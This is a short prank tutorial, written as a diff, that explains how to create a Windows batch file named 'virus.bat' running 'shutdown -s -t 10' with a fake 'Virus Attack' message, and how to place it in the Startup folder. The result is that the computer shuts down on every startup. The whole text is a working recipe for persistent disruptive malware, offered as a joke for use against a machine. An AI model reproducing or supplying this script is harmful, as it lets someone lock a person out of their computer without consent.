@@ -1,0 +1,23 @@
+Open Notepad
+
+Type :
+
+@ECHO OFF
+shutdown -s -t 10 -c “Virus Attack…”
+exit
+
+File >> Save As…
+
+Name it: virus.bat
+
+Start >> All Programs
+
+Right Click on Startup >> Open
+
+This open the Startup folder
+
+Paste the Virus.bat file here!
+
+*** That’s all, now the computer will
+
+automatically shut down on every startup! - lol
